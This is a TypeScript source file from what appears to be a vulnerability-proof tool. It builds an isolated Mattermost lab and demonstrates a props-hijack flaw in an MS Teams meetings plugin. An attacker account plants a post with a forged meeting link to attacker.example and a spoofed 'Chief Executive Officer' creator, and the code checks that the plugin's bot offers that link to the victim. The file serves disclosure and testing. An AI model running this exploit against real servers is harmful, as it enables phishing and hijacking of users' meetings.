import { mkdirSync, writeFileSync } from "node:fs"
import { join } from "node:path"
import {
  ACCOUNTS,
  type Lab,
  type LabAccount,
  forgetLab,
  loadLab,
  parsePosted,
  provision,
  saveLab,
  startMattermost,
  stopMattermost,
  waitForMattermost,
  watchFor,
  Mattermost,
  nothingWithin,
} from "../lab/mattermost.ts"

function message(error: unknown): string {
  return error instanceof Error ? error.message : String(error)
}

/** Brings up an isolated Mattermost with three accounts, a channel and the plugin. */
export async function labUp(): Promise<number> {
  try {
    console.log("starting Mattermost under emulation, this takes a minute")
    const base = startMattermost()
    await waitForMattermost(base)
    console.log(`mattermost answers at ${base}`)
    const lab = await provision(base)
    saveLab(lab)
    console.log(
      `lab ready: team ${lab.teamId}, channel ${lab.channelId}, accounts ${Object.keys(ACCOUNTS).join(", ")}`
    )
    return 0
  } catch (error) {
    console.error(`error:  ${message(error)}`)
    return 1
  }
}

export function labDown(): number {
  try {
    stopMattermost()
    forgetLab()
    console.log("lab removed")
    return 0
  } catch (error) {
    console.error(`error:  ${message(error)}`)
    return 1
  }
}

async function runCommand(lab: Lab, account: LabAccount, command: string): Promise<void> {
  const session = await Mattermost.login(lab.base, account)
  await session.request("POST", "/api/v4/commands/execute", {
    command,
    channel_id: lab.channelId,
  })
}

const ATTACKER_LINK = "https://attacker.example/join?token=stolen"

type Seen = ReturnType<typeof parsePosted>

/** Posts the plugin's bot makes in the lab channel. */
function fromPluginInChannel(lab: Lab): (post: Seen) => boolean {
  return (post) =>
    post !== null && post.channel_id === lab.channelId && post.props.type === "custom_mstmeetings"
}

/**
 * Shows that a member's post properties become the plugin's own "join" button, and that without
 * the planted post the plugin does not offer one.
 */
/** Plants the attacker's post and stops, so a person can run the command in a browser. */
export async function plantPropsHijack(): Promise<number> {
  try {
    const lab = loadLab()
    if (!lab) throw new Error("no lab. Run: shuvuln lab up")
    await plantPost(lab)
    console.log(
      `planted. Within 30 seconds, run "/mstmeetings start" in ${lab.base} as the victim.`
    )
    return 0
  } catch (error) {
    console.error(`error:  ${message(error)}`)
    return 1
  }
}

async function plantPost(lab: Lab): Promise<void> {
  const attacker = await Mattermost.login(lab.base, ACCOUNTS.attacker)
  await attacker.request("POST", "/api/v4/posts", {
    channel_id: lab.channelId,
    message: "shall we hop on a call?",
    props: {
      meeting_provider: "MSTeams",
      meeting_link: ATTACKER_LINK,
      meeting_creator_username: "Chief Executive Officer",
    },
  })
}

export async function provePropsHijack(): Promise<number> {
  try {
    const lab = loadLab()
    if (!lab) throw new Error("no lab. Run: shuvuln lab up")
    const control = await watchFor(lab, ACCOUNTS.victim, 20, fromPluginInChannel(lab))
    await control.ready
    await runCommand(lab, ACCOUNTS.victim, "/mstmeetings start")
    const controlPost = await nothingWithin(control)
    console.log("control, no planted post:")
    console.log(
      controlPost
        ? `  the bot posted: ${JSON.stringify(controlPost.props).slice(0, 200)}`
        : "  the bot posted no meeting post within 20 seconds"
    )

    await plantPost(lab)
    const planted = await watchFor(lab, ACCOUNTS.victim, 20, fromPluginInChannel(lab))
    await planted.ready
    await runCommand(lab, ACCOUNTS.victim, "/mstmeetings start")
    const post = await planted.found
    const hijacked = post?.props.meeting_link === ATTACKER_LINK
    console.log("with the planted post:")
    console.log(`  the bot posted: ${JSON.stringify(post?.props).slice(0, 300)}`)
    console.log(`hijacked: ${hijacked ? "yes, the plugin offered the attacker's link" : "no"}`)
    const home = process.env.SHUVULN_HOME ?? ""
    mkdirSync(join(home, "proofs"), { recursive: true, mode: 0o700 })
    writeFileSync(
      join(home, "proofs", "msteams-props-hijack.json"),
      JSON.stringify(
        {
          provedAt: new Date().toISOString(),
          lab,
          control: controlPost?.props ?? null,
          withPlantedPost: post?.props ?? null,
          hijacked,
        },
        null,
        2
      ),
      { mode: 0o600 }
    )
    return hijacked ? 0 : 1
  } catch (error) {
    console.error(`error:  ${message(error)}`)
    return 1
  }
}
